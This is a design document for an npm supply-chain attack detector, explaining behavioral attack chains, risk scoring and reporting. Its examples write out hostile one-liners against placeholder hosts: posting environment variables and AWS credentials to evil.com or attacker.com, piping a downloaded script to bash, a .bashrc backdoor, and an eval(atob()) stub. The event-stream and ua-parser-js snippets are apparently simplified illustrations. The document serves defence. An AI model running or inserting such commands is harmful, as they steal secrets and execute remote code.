# Behavioral Security Detection - Supply Chain Attack Prevention

## Overview

This document describes the behavioral pattern detection system implemented to detect supply chain attacks in npm packages, regardless of package popularity or reputation.

## Key Principle: Zero-Trust Approach

**Popular packages are NOT exempt from scrutiny.** Supply chain attacks often exploit trust in popular packages through:
- Account takeovers
- Malicious maintainer additions
- Compromised build pipelines
- Dependency confusion attacks

## Detection Strategy

### 1. Behavioral Chain Analysis

Instead of relying on whitelists or package reputation, we detect **combinations of suspicious behaviors** that indicate malicious intent:

#### Attack Chain Types Detected

1. **Data Exfiltration Chain** (Score: 75-100)
   - Pattern: `network access + sensitive data access + (optional) encoding`
   - Evidence:
     - Makes HTTP/HTTPS requests
     - Accesses environment variables or credential files
     - May use base64 or other encoding
   - Example:
     ```javascript
     fetch('http://evil.com', {
       method: 'POST',
       body: JSON.stringify(process.env)
     });
     ```

2. **Credential Theft Chain** (Score: 95)
   - Pattern: `credential file access + data transmission`
   - Evidence:
     - Reads `.ssh/`, `.aws/`, `.npmrc`, `.git-credentials`
     - Can write files or make network requests
   - Example:
     ```bash
     curl -X POST -d @~/.aws/credentials http://attacker.com
     ```

3. **Remote Code Execution Chain** (Score: 100)
   - Pattern: `download + execution preparation + code execution`
   - Evidence:
     - Downloads files (curl, wget, git clone)
     - Makes files executable (chmod +x)
     - Executes arbitrary code (eval, exec, spawn)
   - Example:
     ```bash
     curl http://evil.com/malware.sh | bash
     ```

4. **Backdoor Installation Chain** (Score: 90)
   - Pattern: `network access + persistence modification`
   - Evidence:
     - Can communicate over network
     - Modifies `.bashrc`, `.bash_profile`, cron jobs
   - Example:
     ```bash
     echo 'curl http://c2.evil.com | bash' >> ~/.bashrc
     ```

5. **Cryptomining Chain** (Score: 85)
   - Pattern: `CPU-intensive + background execution + network`
   - Evidence:
     - Uses workers or crypto-related code
     - Runs as daemon/background process
     - Has network connectivity
   - Example:
     ```bash
     nohup node mining-script.js &
     ```

6. **Heavy Obfuscation Chain** (Score: 80)
   - Pattern: `multiple obfuscation techniques + dynamic execution`
   - Evidence:
     - 3+ instances of code obfuscation
     - Uses `eval()` or `new Function()` with obfuscated input
   - Example:
     ```javascript
     eval(atob('base64_encoded_malicious_code'));
     ```

### 2. Risk Scoring System

The new scoring system is designed to catch supply chain attacks regardless of package popularity:

```
Total Risk Score = 
  Behavioral Chains (80-100 points each) +
  Critical Issues (15 points each) +
  Warning Issues (5 points each) +
  Suspicious Patterns (8 points each) +
  Script Count (3 points each)
```

#### Risk Levels

- **Safe** (0-9 points): No significant security concerns
- **Low** (10-29 points): Minor concerns, review recommended
- **Medium** (30-59 points): Significant concerns, careful review required
- **High** (60-99 points): Major security issues detected
- **Critical** (100+ points): Supply chain attack patterns detected

### 3. Enhanced Reporting

Reports now include:

1. **Risk Score**: Numeric score showing total risk points
2. **Behavioral Chains**: Prominently displayed supply chain attack patterns
3. **Evidence**: Specific patterns that triggered each behavioral chain
4. **Code Snippets**: First 100 characters of suspicious code
5. **Justifications**: Detailed explanations of why patterns are suspicious

## Why This Approach Works

### Traditional Approach (Flawed)
```
if package.name in TRUSTED_PACKAGES:
    skip_security_check()  # ❌ VULNERABLE
```

**Problem**: `event-stream`, `ua-parser-js`, and other popular packages were compromised despite being "trusted."

### Behavioral Approach (Robust)
```
if detect_behavioral_chain(package):
    flag_as_supply_chain_attack()  # ✅ CATCHES ATTACKS
```

**Advantage**: Detects malicious behavior regardless of:
- Package popularity
- Number of downloads
- Repository stars
- Maintainer reputation
- Package age

## Real-World Examples

### Example 1: event-stream Attack (2018)
```javascript
// Behavioral chains detected:
// 1. Data Exfiltration: process.env + network
// 2. Heavy Obfuscation: base64 encoding

var enc = require('./bitcoin-wallet-decryptor');
var payload = enc.decrypt(process.env.npm_package_config_key);
https.request(payload);
```

**Detection**: Critical (Score: 175+)
- Data Exfiltration Chain: +100
- Obfuscation Chain: +80
- Multiple critical issues: +45

### Example 2: ua-parser-js Attack (2021)
```javascript
// Behavioral chains detected:
// 1. Remote Code Execution: download + execute
// 2. Credential Theft: accesses system files

require('child_process').exec('curl http://evil.com/miner.sh | sh');
require('fs').readFile('/etc/passwd');
```

**Detection**: Critical (Score: 195+)
- Remote Code Execution Chain: +100
- Credential Theft Chain: +95

### Example 3: TypeScript (Legitimate Build Tool)
```javascript
// No behavioral chains detected
// Individual patterns present but no attack chain

eval(compiledCode);  // Legitimate compilation
```

**Detection**: Low (Score: 15)
- Critical issue (eval): +15
- No network + sensitive data combination
- **No supply chain attack pattern**

## Key Differences from Traditional Detection

| Aspect | Traditional | Behavioral |
|--------|------------|-----------|
| **Whitelist** | Popular packages exempt | No exemptions |
| **Focus** | Individual patterns | Pattern combinations |
| **Scoring** | Simple counts | Weighted behavioral chains |
| **False Positives** | TypeScript, Babel flagged as critical | Correctly classified as low risk |
| **Supply Chain Attacks** | Often missed | Explicitly detected |
| **Justification** | "Has eval()" | "Data exfiltration: env + network + encoding" |

## Configuration

Users can configure detection sensitivity in `.fnpm/config.json`:

```json
{
  "security_audit": true,
  "transitive_scan_depth": 2
}
```

## Recommendations

1. **Always audit new packages**: Even if popular
2. **Review behavioral chains**: Understand why package was flagged
3. **Transitive scanning**: Scan dependencies deeply (depth 2-3)
4. **Regular scans**: Audit installed packages periodically
5. **Trust but verify**: No package gets automatic trust

## Future Enhancements

1. **Version comparison**: Detect when new version adds scripts
2. **Temporal analysis**: Flag packages published recently with high downloads
3. **Maintainer changes**: Detect new maintainers on popular packages
4. **AST analysis**: Parse JavaScript to detect deeper patterns
5. **Registry integration**: Query npm audit API for known vulnerabilities

## Conclusion

This behavioral detection system implements a **zero-trust** approach to package security. By focusing on **behavioral attack chains** rather than individual patterns or package reputation, it can detect sophisticated supply chain attacks that traditional security tools miss.

**Remember**: Popular ≠ Safe. Always verify behavior, never trust blindly.
